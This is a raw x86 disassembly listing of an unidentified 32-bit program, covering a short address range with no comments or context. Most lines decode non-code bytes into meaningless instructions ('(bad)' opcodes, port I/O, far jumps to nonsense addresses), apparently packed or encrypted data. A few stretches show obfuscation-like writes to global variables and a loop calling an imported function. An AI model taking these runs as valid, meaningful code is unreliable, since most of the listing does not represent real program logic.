  40a57c:	in     eax,dx
  40a57d:	and    eax,0x7f20b786
  40a582:	push   edx
  40a583:	scas   eax,DWORD PTR es:[edi]
  40a584:	sub    ebp,DWORD PTR [ebx-0x28d38cc5]
  40a58a:	cmp    BYTE PTR [esi],dl
  40a58c:	xor    eax,0xd1b596a5
  40a591:	jae    0x40a52a
  40a593:	jnp    0x40a5f1
  40a595:	call   0x892df054
  40a59a:	pop    ds
  40a59b:	aas    
  40a59c:	jns    0x40a525
  40a59e:	mov    DWORD PTR [eax-0x22aef819],ebx
  40a5a4:	jle    0x40a5ab
  40a5a6:	pop    ds
  40a5a7:	jbe    0x40a5e2
  40a5a9:	aam    0xa3
  40a5ab:	or     ecx,DWORD PTR [ecx+0x7a977b25]
  40a5b1:	push   0x9f9a1c76
  40a5b6:	jnp    0x40a602
  40a5b8:	jns    0x40a585
  40a5ba:	pop    es
  40a5bb:	xchg   esi,eax
  40a5bc:	adc    ebp,DWORD PTR [ebx+0x558296a3]
  40a5c2:	shl    DWORD PTR [edi],0x11
  40a5c5:	nop
  40a5c6:	out    0x58,al
  40a5c8:	adc    BYTE PTR [ecx],dl
  40a5ca:	repz dec ebp
  40a5cc:	and    BYTE PTR [eax+0x463da6d3],bh
  40a5d2:	lods   al,BYTE PTR ds:[esi]
  40a5d3:	pop    ds
  40a5d4:	imul   ebp,DWORD PTR ds:0xaa9488ec,0xa7a87327
  40a5de:	fisub  DWORD PTR [edx]
  40a5e0:	mov    al,ds:0x3ca9dc87
  40a5e5:	and    al,0xc
  40a5e7:	mov    DWORD PTR [ebx],ebp
  40a5e9:	cmc    
  40a5ea:	les    esi,FWORD PTR [edi+0x19457856]
  40a5f0:	fbld   TBYTE PTR ds:0x6389c55c
  40a5f6:	adc    DWORD PTR [eax-0x4d],ecx
  40a5f9:	jmp    0x40a61f
  40a5fb:	call   0x916b0106
  40a600:	not    BYTE PTR ds:0xc3738332
  40a606:	popf   
  40a607:	mov    eax,ds:0x8354c96b
  40a60c:	and    esp,DWORD PTR [esi]
  40a60e:	sbb    al,0xa5
  40a610:	stos   DWORD PTR es:[edi],eax
  40a611:	fnstcw WORD PTR [esi]
  40a613:	rcr    DWORD PTR [ecx],cl
  40a615:	ins    DWORD PTR es:[edi],dx
  40a616:	adc    esp,DWORD PTR [ebx]
  40a618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61a:	cld    
  40a61b:	and    eax,0x14b0174d
  40a620:	jle    0x40a69d
  40a622:	ds lock hlt 
  40a625:	adc    dh,BYTE PTR [ebx-0x736c71c1]
  40a62b:	pop    edx
  40a62c:	mov    DWORD PTR [edx+0x5a],esp
  40a62f:	in     eax,0xb7
  40a631:	dec    eax
  40a632:	shr    ah,1
  40a634:	bound  ebx,QWORD PTR ds:0x78b8e2aa
  40a63a:	xchg   esp,eax
  40a63b:	ror    DWORD PTR [edi-0x3e],cl
  40a63e:	xchg   esi,eax
  40a63f:	loopne 0x40a690
  40a641:	mov    al,ds:0x9f84ff2e
  40a646:	ret    
  40a647:	cs scas eax,DWORD PTR es:[edi]
  40a649:	and    ch,BYTE PTR [edi-0x55]
  40a64c:	pslld  mm1,QWORD PTR [ebp+0x1d]
  40a650:	out    0x5,eax
  40a652:	cmp    dh,dh
  40a654:	out    dx,al
  40a655:	xor    eax,0x694a80a9
  40a65a:	pop    esi
  40a65b:	adc    edi,DWORD PTR [esi+0x49]
  40a65e:	cmp    eax,DWORD PTR [edx]
  40a660:	adc    dh,ch
  40a662:	add    ebp,DWORD PTR [ebp+0x48ff11e4]
  40a668:	inc    ebp
  40a669:	imul   esi,DWORD PTR [esi-0x70],0xfffffff5
  40a66d:	(bad)  
  40a66e:	in     al,dx
  40a66f:	ins    DWORD PTR es:[edi],dx
  40a670:	popa   
  40a671:	mov    ch,0x39
  40a673:	or     DWORD PTR [esi+0x141ccd0f],esp
  40a679:	fwait
  40a67a:	jle    0x40a6d8
  40a67c:	inc    esi
  40a67d:	jno    0x40a616
  40a67f:	sub    al,0x3
  40a681:	mov    es,WORD PTR [ecx-0xc9463a9]
  40a687:	das    
  40a688:	bound  ecx,QWORD PTR [eax+0x50]
  40a68b:	dec    esp
  40a68c:	cmp    dh,BYTE PTR [esi+0x79c6140c]
  40a692:	test   eax,0xf799168d
  40a697:	rcl    BYTE PTR [eax+0x1a583f3a],0xdd
  40a69e:	mov    bh,bh
  40a6a0:	mov    al,ds:0x7c5bbff3
  40a6a5:	ficom  DWORD PTR [esi-0xb]
  40a6a8:	inc    edx
  40a6a9:	push   esi
  40a6aa:	push   esi
  40a6ab:	jp     0x40a690
  40a6ad:	sub    eax,ebx
  40a6af:	in     eax,dx
  40a6b0:	adc    esp,ebx
  40a6b2:	mov    eax,ds:0xa6978115
  40a6b7:	lods   eax,DWORD PTR ds:[esi]
  40a6b8:	add    BYTE PTR [edx-0x28a5a0fb],dl
  40a6be:	fild   WORD PTR [esi+0x31]
  40a6c1:	or     DWORD PTR [edx],ebx
  40a6c3:	cmp    eax,0xc5163717
  40a6c8:	fisttp DWORD PTR [edi+ebx*1-0x20]
  40a6cc:	fucom  st(7)
  40a6ce:	pop    ebx
  40a6cf:	stos   DWORD PTR es:[edi],eax
  40a6d0:	test   eax,0xf6d884f
  40a6d5:	dec    ecx
  40a6d6:	mov    eax,ds:0x12d333b1
  40a6db:	add    ch,BYTE PTR [edi+0x13360345]
  40a6e1:	mov    edx,0xcbb96823
  40a6e6:	shl    bl,1
  40a6e8:	dec    edi
  40a6e9:	jp     0x40a727
  40a6eb:	xor    eax,0xc7f83b73
  40a6f0:	add    eax,0x4337eb
  40a6f5:	test   al,0x5a
  40a6f7:	add    BYTE PTR [eax],al
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4337d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x245cec0c
  40a7ac:	adc    DWORD PTR [edi],esi
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	aam    0xca
  40a7b8:	xchg   ebp,eax
  40a7b9:	loop   0x40a74c
  40a7bb:	lahf   
  40a7bc:	dec    ebp
  40a7bd:	jmp    esi
  40a7bf:	test   DWORD PTR [ebp+0x6c1adaeb],edx
  40a7c5:	in     al,dx
  40a7c6:	xchg   ebx,eax
  40a7c7:	sub    BYTE PTR [ecx+0x11],bh
  40a7ca:	dec    edi
  40a7cb:	out    dx,al
  40a7cc:	fidivr WORD PTR [eax+0x49]
  40a7cf:	gs mov ch,0xc4
  40a7d2:	inc    esi
  40a7d3:	das    
  40a7d4:	dec    ebx
  40a7d5:	retf   0x2176
  40a7d8:	in     eax,0xea
  40a7da:	inc    eax
  40a7db:	jg     0x40a7f7
  40a7dd:	iret   
  40a7de:	push   ebx
  40a7df:	xchg   edx,eax
  40a7e0:	jns    0x40a857
  40a7e2:	out    0xa,al
  40a7e4:	aam    0xa7
  40a7e6:	sahf   
  40a7e7:	mov    ds:0xcfdd6d3c,eax
  40a7ec:	pusha  
  40a7ed:	push   ds
  40a7ee:	jl     0x40a817
  40a7f0:	add    al,0x38
  40a7f2:	xchg   ecx,eax
  40a7f3:	jmp    0x40a7cf
  40a7f5:	pushf  
  40a7f6:	mov    edi,DWORD PTR [esi+0x27]
  40a7f9:	sbb    al,0xa8
  40a7fb:	jmp    0x40a796
  40a7fd:	imul   BYTE PTR [esi]
  40a7ff:	pop    esp
  40a800:	mov    eax,ds:0xfa22e8d6
  40a805:	mov    cl,0xc4
  40a807:	jmp    0x40a7db
  40a809:	push   esp
  40a80a:	jmp    0x40a7f6
  40a80c:	dec    ecx
  40a80d:	or     dh,BYTE PTR [esi-0x158a8a64]
  40a813:	add    eax,0xd059ac64
  40a818:	lahf   
  40a819:	lods   eax,DWORD PTR ds:[esi]
  40a81a:	push   ecx
  40a81b:	pop    ds
  40a81c:	lock in eax,0x2b
  40a81f:	popa   
  40a820:	iret   
  40a821:	pusha  
  40a822:	lock sbb DWORD PTR [esp+ecx*2],0x46
  40a827:	ins    BYTE PTR es:[edi],dx
  40a828:	daa    
  40a829:	pop    esp
  40a82a:	mov    gs,WORD PTR [edi]
  40a82c:	(bad)
  40a82f:	mov    esp,0x7323b04
  40a834:	fstp   DWORD PTR [ecx+0x439b6ab0]
  40a83a:	mov    ah,0x43
  40a83c:	xor    dh,cl
  40a83e:	daa    
  40a83f:	mov    ebp,0x75ac5c26
  40a844:	in     al,dx
  40a845:	out    0x6e,eax
  40a847:	xlat   BYTE PTR ds:[ebx]
  40a848:	(bad)  
  40a849:	aas    
  40a84a:	das    
  40a84b:	in     eax,0xf3
  40a84d:	push   eax
  40a84e:	dec    ecx
  40a84f:	sbb    ecx,edx
  40a851:	and    dl,BYTE PTR [eax]
  40a853:	mov    edi,0x948885c7
  40a858:	dec    ebx
  40a859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a85a:	push   esp
  40a85b:	jb     0x40a86c
  40a85d:	popf   
  40a85e:	jb     0x40a7ff
  40a860:	cs icebp 
  40a862:	mov    bh,dh
  40a864:	xchg   ecx,eax
  40a865:	hlt    
  40a866:	loope  0x40a893
  40a868:	sbb    DWORD PTR [edx-0x24],ebx
  40a86b:	repz callw 0x68ba
  40a870:	stc    
  40a871:	imul   esi,DWORD PTR [ecx+edx*4],0x42
  40a875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a876:	mov    ah,0xf9
  40a878:	dec    esp
  40a879:	jecxz  0x40a87a
  40a87b:	jle    0x40a8dd
  40a87d:	pushw  ss
  40a87f:	mov    esi,0x727ad803
  40a884:	cmp    eax,0xf75d2f83
  40a889:	jecxz  0x40a8a7
  40a88b:	mov    dl,BYTE PTR [ebx]
  40a88d:	idiv   BYTE PTR [edi]
  40a88f:	push   ebx
  40a890:	jne    0x40a8d0
  40a892:	cld    
  40a893:	outs   dx,BYTE PTR ds:[esi]
  40a894:	jno    0x40a8f0
  40a896:	jnp    0x40a872
  40a898:	sub    al,0x1d
  40a89a:	out    0x98,eax
  40a89c:	sbb    cl,BYTE PTR [ebx+0x79]
  40a89f:	leave  
  40a8a0:	int3   
  40a8a1:	sub    ebp,DWORD PTR [ecx+0x22]
  40a8a4:	int    0x7e
  40a8a6:	out    0x9,al
  40a8a8:	cmc    
  40a8a9:	xchg   ecx,eax
  40a8aa:	outs   dx,DWORD PTR ds:[esi]
  40a8ab:	push   ecx
  40a8ac:	mov    DWORD PTR [ebx-0x5c],esi
  40a8af:	jno    0x40a88a
  40a8b1:	dec    eax
  40a8b2:	pop    ecx
  40a8b3:	sub    eax,0x65
  40a8b6:	call   0x41ec:0x3b6916fd
  40a8bd:	test   eax,0x59e4d0f4
  40a8c2:	adc    al,0xe5
  40a8c4:	mov    edx,0x77895916
  40a8c9:	lea    ebp,[edx+ecx*4+0x5e]
  40a8cd:	and    eax,0xc8ba5247
  40a8d2:	jo     0x40a87d
  40a8d4:	jle    0x40a8ac
  40a8d6:	enter  0x4840,0x3f
  40a8da:	cli    
  40a8db:	jb     0x40a8fb
  40a8dd:	sbb    dh,al
  40a8df:	add    ah,0xa0
  40a8e2:	xor    cl,BYTE PTR [ebp-0x4]
  40a8e5:	mov    bh,BYTE PTR [ecx+0x68]
  40a8e8:	retf   0xb09d
  40a8eb:	lock punpckhwd mm4,QWORD PTR [ecx+ebp*4+0x7d]
  40a8f1:	lods   al,BYTE PTR ds:[esi]
  40a8f2:	push   eax
  40a8f3:	dec    edx
  40a8f4:	sub    esi,DWORD PTR [ebx+eax*8]
  40a8f7:	(bad)  
  40a8f8:	rcr    BYTE PTR [ecx+0x4e55a2b6],cl
  40a8fe:	push   esp
  40a8ff:	popf   
  40a900:	mov    ecx,0x1bae0a59
  40a905:	retf   
  40a906:	sub    al,0x57
  40a908:	xor    eax,0x62de94b3
  40a90d:	cmp    dh,BYTE PTR [edx-0x386359df]
  40a913:	sbb    al,0xd3
  40a915:	push   esi
  40a916:	fdivrp st(1),st
  40a918:	pop    es
  40a919:	lds    edi,FWORD PTR [esi]
  40a91b:	pop    esi
  40a91c:	daa    
  40a91d:	xor    bl,BYTE PTR [esi]
  40a91f:	cmp    eax,DWORD PTR [ecx+0x60]
  40a922:	idiv   DWORD PTR [edx]
  40a924:	(bad)  
  40a925:	pop    eax
  40a926:	xchg   edx,eax
  40a927:	shl    esp,1
  40a929:	ret    0xc8c5
  40a92c:	std    
  40a92d:	add    bh,BYTE PTR [ebx]
  40a92f:	repnz test DWORD PTR [eax],esi
  40a932:	mov    dl,0xac
  40a934:	jmp    0x40a961
  40a936:	fisubr WORD PTR [ebx]
  40a938:	outs   dx,BYTE PTR ds:[esi]
  40a939:	ins    BYTE PTR es:[edi],dx
  40a93a:	mov    es,WORD PTR es:[esi+0x62]
  40a93e:	push   cs
  40a93f:	iret   
  40a940:	inc    esi
  40a941:	in     eax,dx
  40a942:	mov    cl,0xc7
  40a944:	mov    al,BYTE PTR [eax+esi*4]
  40a947:	xchg   esi,eax
  40a948:	mov    DWORD PTR [ebp+0x47bedc26],ebx
  40a94e:	mov    ebp,esi
  40a950:	cmp    edi,DWORD PTR [ebp+0x4d]
  40a953:	adc    eax,DWORD PTR [edx+ebp*4+0x115f8604]
  40a95a:	or     DWORD PTR ds:0x769ba5b6,ebx
  40a960:	push   ds
  40a961:	xor    eax,0x9b656920
  40a966:	jbe    0x40a972
  40a968:	jl     0x40a973
  40a96a:	dec    edx
  40a96b:	xchg   edx,eax
  40a96c:	pop    ebp
  40a96d:	ror    DWORD PTR ds:0x9659b722,1
  40a973:	pusha  
  40a974:	(bad)  
  40a976:	cmp    eax,0x9434d891
  40a97b:	jp     0x40a9f2
  40a97d:	test   DWORD PTR [ecx-0x2deda73e],ebx
  40a983:	jle    0x40a909
  40a985:	call   0x2f8cbbc2
  40a98a:	xchg   edx,eax
  40a98b:	dec    ebp
  40a98c:	ret    0xc61f
  40a98f:	push   edi
  40a990:	ret    0xe119
  40a993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a994:	adc    eax,0x956eebc1
  40a999:	push   esp
  40a99a:	loope  0x40a9f6
  40a99c:	add    BYTE PTR [edx+0x37],dh
  40a99f:	push   edx
  40a9a0:	sub    BYTE PTR [eax-0x74cde06a],0x1b
  40a9a7:	mov    edi,0xfb666bb7
  40a9ac:	repz xlat BYTE PTR ds:[ebx]
  40a9ae:	inc    edi
  40a9af:	mov    DWORD PTR [ecx+0x703d8aa0],eax
  40a9b5:	mov    edi,DWORD PTR [ecx+0x6f]
  40a9b8:	adc    ch,0xfb
  40a9bb:	nop
  40a9bc:	repnz adc eax,0x725d087e
  40a9c2:	inc    esp
  40a9c3:	xor    DWORD PTR [esi],0xf1c44b79
  40a9c9:	and    BYTE PTR [edi+0x6eef7f4d],cl
  40a9cf:	(bad)  
  40a9d0:	sub    BYTE PTR [edx],dl
  40a9d2:	into   
  40a9d3:	call   DWORD PTR [esi-0x37552d34]
  40a9d9:	popa   
  40a9da:	sub    DWORD PTR [ecx],eax
  40a9dc:	lock mov WORD PTR [edx+0x44c81a84],ss
  40a9e3:	mov    cl,0xdd
  40a9e5:	jmp    0x1f739ce1
  40a9ea:	in     eax,dx
  40a9eb:	gs push edi
  40a9ed:	inc    edx
  40a9ee:	and    ebx,0x72
  40a9f1:	in     al,dx
  40a9f2:	es dec edi
  40a9f4:	aaa    
  40a9f5:	xor    eax,DWORD PTR [ecx+0x6da6bb0a]
  40a9fb:	mov    ds:0x8bec4589,al
  40aa00:	inc    ebp
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	push   edi
  40aa35:	into   
  40aa36:	dec    edi
  40aa37:	popf   
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	outs   dx,BYTE PTR ds:[esi]
  40aa41:	pop    esp
  40aa42:	jbe    0x40aa08
  40aa44:	push   ds
  40aa45:	mov    al,ds:0x35020fbf
  40aa4a:	mov    BYTE PTR [ecx-0x290a5d6a],dh
  40aa50:	xchg   ebp,eax
  40aa51:	inc    esp
  40aa52:	je     0x40aa75
  40aa54:	jle    0x40aa1f
  40aa56:	push   ss
  40aa57:	dec    edi
  40aa58:	dec    ebp
  40aa59:	pop    ss
  40aa5a:	add    al,0xee
  40aa5c:	mov    edx,0xa40b888e
  40aa61:	repnz inc ebx
  40aa63:	mov    cl,0xb3
  40aa65:	mov    al,ds:0xc7e3084
  40aa6a:	(bad)  
  40aa6b:	out    dx,eax
  40aa6c:	adc    al,0xe0
  40aa6e:	inc    esi
  40aa6f:	pop    edi
  40aa70:	out    dx,al
  40aa71:	fnstsw WORD PTR [ebp+0x3e67f069]
  40aa77:	xchg   ebx,eax
  40aa78:	jecxz  0x40aa45
  40aa7a:	dec    esi
  40aa7b:	bound  ebp,QWORD PTR [eax+edi*8]
  40aa7e:	retf   
  40aa7f:	mov    ds:0x2bc6c735,eax
  40aa84:	xlat   BYTE PTR ds:[ebx]
  40aa85:	test   al,0x27
  40aa87:	push   ecx
  40aa88:	arpl   ax,di
  40aa8a:	mov    dh,0x5a
  40aa8c:	mov    bl,0xea
  40aa8e:	mov    esi,0x46eeadb9
  40aa93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa94:	xor    al,0x0
  40aa96:	jb     0x40aa98
  40aa98:	les    esp,FWORD PTR [edi-0x14]
  40aa9b:	sbb    cl,BYTE PTR [edx+eax*4]
  40aa9e:	adc    eax,0x59431a89
  40aaa3:	jb     0x40aa6b
  40aaa5:	cmp    DWORD PTR [ebx],esi
  40aaa7:	add    edi,edi
  40aaa9:	cmp    al,0xec
  40aaab:	loope  0x40ab23
  40aaad:	retf   0xce97
  40aab0:	mov    bh,0xa3
  40aab2:	dec    esp
  40aab3:	jne    0x40aaba
  40aab5:	or     ebx,DWORD PTR [edi]
  40aab7:	push   ebp
  40aab8:	inc    ebx
  40aab9:	xor    al,0xc2
  40aabb:	data16 or ch,BYTE PTR [ebx+0x17ceca25]
  40aac2:	sub    cl,BYTE PTR [esi+0x25]
  40aac5:	je     0x40aa8b
  40aac7:	sbb    al,0x19
  40aac9:	fcomp  DWORD PTR [edx-0x703c2a2a]
  40aacf:	sbb    eax,0x90855df5
  40aad4:	repnz call 0xbe3d:0x7ac15a78
  40aadc:	outs   dx,BYTE PTR ds:[esi]
  40aadd:	mov    bh,0xc1
  40aadf:	cmp    cl,BYTE PTR [ebx]
  40aae1:	aas    
  40aae2:	out    0x78,al
  40aae4:	cli    
  40aae5:	mov    cl,0xb
  40aae7:	stc    
  40aae8:	and    BYTE PTR [ebp-0x5b1c8482],ch
  40aaee:	pop    esp
  40aaef:	(bad)  
  40aaf0:	int3   
  40aaf1:	dec    ebx
  40aaf2:	xchg   ecx,eax
  40aaf3:	or     eax,0x18e13b7a
  40aaf8:	or     al,0xdd
  40aafa:	jmp    0x40aa80
  40aafc:	cmp    bl,BYTE PTR [edi]
  40aafe:	xlat   BYTE PTR ds:[ebx]
  40aaff:	jne    0x40ab51
  40ab01:	cld    
  40ab02:	ror    DWORD PTR [esi],cl
  40ab04:	(bad)  
  40ab05:	es push esi
  40ab07:	jl     0x40ab52
  40ab09:	mov    WORD PTR [edx],ds
  40ab0b:	scas   eax,DWORD PTR es:[edi]
  40ab0c:	and    bl,dh
  40ab0e:	jp     0x40ab27
  40ab10:	iret   
  40ab11:	cmp    al,0x3a
  40ab13:	sub    DWORD PTR [edi+edx*4+0x557f895a],edx
  40ab1a:	bound  ebp,QWORD PTR [ecx-0x5871839d]
  40ab20:	xchg   esp,eax
  40ab21:	mov    ch,0xfa
  40ab23:	pop    edx
  40ab24:	pop    esp
  40ab25:	out    dx,al
  40ab26:	xor    BYTE PTR [esi],cl
  40ab28:	sub    bl,BYTE PTR [ebx]
  40ab2a:	or     BYTE PTR [edi],bl
  40ab2c:	cmp    DWORD PTR [ebx],esp
  40ab2e:	aaa    
  40ab2f:	and    eax,0x7e08a38f
  40ab34:	or     BYTE PTR [eax+0x2c],cl
  40ab37:	push   edi
  40ab38:	inc    eax
  40ab39:	ja     0x40ab4b
  40ab3b:	push   edx
  40ab3c:	aad    0x8d
  40ab3e:	sub    DWORD PTR [edx+0x11003e84],ecx
  40ab44:	imul   ebp,DWORD PTR [edi],0xffffffce
  40ab47:	dec    ebp
  40ab48:	icebp  
  40ab49:	or     BYTE PTR [edx+0x362b1d5d],0x46
  40ab50:	ins    DWORD PTR es:[edi],dx
  40ab51:	adc    edi,0xb0c52273
  40ab57:	mul    BYTE PTR [ecx+0x7]
  40ab5a:	or     dl,0xa0
  40ab5d:	pop    eax
  40ab5e:	push   cs
  40ab5f:	test   al,0x44
  40ab61:	je     0x40ab87
  40ab63:	out    dx,eax
  40ab64:	dec    edi
  40ab65:	fmul   st,st(7)
  40ab67:	enter  0x1d9e,0x0
  40ab6b:	test   eax,0xe8caaae4
  40ab70:	cmp    esi,ebx
  40ab72:	dec    edx
  40ab73:	mov    ebp,0x1c1575e
  40ab78:	xchg   esp,eax
  40ab79:	xchg   DWORD PTR [eax-0x70e4a1d3],edx
  40ab7f:	stc    
  40ab80:	mov    ebx,0xe1b99ffc
  40ab85:	aam    0xfd
  40ab87:	pop    eax
  40ab88:	mov    edi,0x1d06c908
  40ab8d:	jecxz  0x40ab24
  40ab8f:	push   edi
  40ab90:	lock aaa 
  40ab92:	pop    edi
  40ab93:	jmp    0x7ca:0x89a97c65
  40ab9a:	shr    DWORD PTR [edi-0xa],1
  40ab9d:	push   edi
  40ab9e:	xchg   ebp,eax
  40ab9f:	mov    dh,0x83
  40aba1:	mov    ch,0xcb
  40aba3:	addr16 bnd jne 0x40ac06
  40aba7:	jmp    0xd6e7:0x8e315540
  40abae:	bound  esp,QWORD PTR [ebx]
  40abb0:	dec    ebp
  40abb1:	lock mov gs,WORD PTR [esi]
  40abb4:	sti    
  40abb5:	and    al,0x2f
  40abb7:	jp     0x40ab8d
  40abb9:	xchg   edi,ecx
  40abbb:	ss or  BYTE PTR gs:[ebx],cl
  40abbf:	clc    
  40abc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abc1:	pop    ecx
  40abc2:	je     0x40ab90
  40abc4:	pop    eax
  40abc5:	mov    WORD PTR [edx],cs
  40abc7:	daa    
  40abc8:	cmp    ebp,DWORD PTR [ecx-0x2517fb43]
  40abce:	ins    DWORD PTR es:[edi],dx
  40abcf:	test   BYTE PTR [ebp-0x676710b9],ch
  40abd5:	jp     0x40ab9c
  40abd7:	jo     0x40abd6
  40abd9:	cdq    
  40abda:	xor    edi,DWORD PTR [ebx]
  40abdc:	imul   esp,DWORD PTR [eax],0xffffffff
  40abdf:	(bad)  
  40abe0:	cmp    al,0x38
  40abe2:	(bad)  
  40abe3:	push   cs
  40abe4:	push   0x660de189
  40abe9:	loope  0x40abad
  40abeb:	jns    0x40ab83
  40abed:	fcom   QWORD PTR [esi-0x4f946206]
  40abf3:	inc    ebx
  40abf4:	pop    ebx
  40abf5:	stos   DWORD PTR es:[edi],eax
  40abf6:	bound  edi,QWORD PTR [edx-0x44]
  40abf9:	mov    DWORD PTR [ebx-0x4974388d],ebp
  40abff:	ds cld 
  40ac01:	in     al,0x38
  40ac03:	dec    esi
  40ac04:	retf   
  40ac05:	fst    DWORD PTR [ecx]
  40ac07:	jge    0x40abd6
  40ac09:	add    DWORD PTR ds:0x3b630970,ecx
  40ac0f:	leave  
  40ac10:	push   edx
  40ac11:	jp     0x40ac62
  40ac13:	jecxz  0x40abf6
  40ac15:	jns    0x40ac7d
  40ac17:	in     eax,dx
  40ac18:	mov    edi,0xf4142f85
  40ac1d:	xchg   edx,eax
  40ac1e:	xchg   ecx,eax
  40ac1f:	out    dx,al
  40ac20:	dec    esp
  40ac21:	into   
  40ac22:	iret   
  40ac23:	pop    ds
  40ac24:	add    al,0xd
  40ac26:	int3   
  40ac27:	jg     0x40ac6f
  40ac29:	or     DWORD PTR [ecx-0x6811817b],esp
  40ac2f:	shl    BYTE PTR [ebp+0x45],1
  40ac32:	jne    0x40ac2f
  40ac34:	in     al,0x82
  40ac36:	xchg   esi,eax
  40ac37:	mov    ds:0x5ffb4f9b,eax
  40ac3c:	ret    
  40ac3d:	sub    ebp,DWORD PTR [edx+edi*1]
  40ac40:	xor    bh,BYTE PTR [ebp-0x613e4ca4]
  40ac46:	test   ecx,ecx
  40ac48:	js     0x40ac37
  40ac4a:	push   ds
  40ac4b:	cmp    al,0x98
  40ac4d:	or     al,0xc3
  40ac4f:	adc    ch,BYTE PTR [esi-0xa]
  40ac52:	jge    0x40ac79
  40ac54:	out    dx,eax
  40ac55:	sti    
  40ac56:	inc    ecx
  40ac57:	mov    ds:0xf9e022d2,al
  40ac5c:	sti    
  40ac5d:	jno    0x40abff
  40ac5f:	sub    eax,0xc79533a2
  40ac64:	retf   
  40ac65:	push   ecx
  40ac66:	pop    eax
  40ac67:	jg     0x40ac7d
  40ac69:	mov    bl,0x23
  40ac6b:	inc    esi
  40ac6c:	jmp    0x8229:0x4c7d8e12
  40ac73:	mov    ds:0x36aeec9e,al
  40ac78:	push   ebx
  40ac79:	in     eax,0xf6
  40ac7b:	loop   0x40ac28
  40ac7d:	call   esp
  40ac7f:	stc    
  40ac80:	retf   
  40ac81:	cmp    BYTE PTR [edi+0x3b210d85],cl
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	jmp    0x40acc9
  40ac92:	inc    ebx
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	outs   dx,DWORD PTR ds:[esi]
  40ac9e:	cmp    BYTE PTR [ebx+0x0],al
  40aca1:	add    BYTE PTR [eax],al
  40aca3:	add    BYTE PTR [eax],al
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x72254856],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad03
  40ad2c:	aam    0xed
  40ad2e:	push   ds
  40ad2f:	and    edx,eax
  40ad31:	(bad)  
  40ad32:	jmp    0x5737:0x53b76bd9
  40ad39:	and    DWORD PTR [eax+0x5d],ecx
  40ad3c:	mov    eax,ds:0x78141360
  40ad41:	dec    edx
  40ad42:	les    esp,FWORD PTR [ebp-0x5e]
  40ad45:	arpl   bp,ax
  40ad47:	retf   
  40ad48:	lds    esi,FWORD PTR [esi+0x5b]
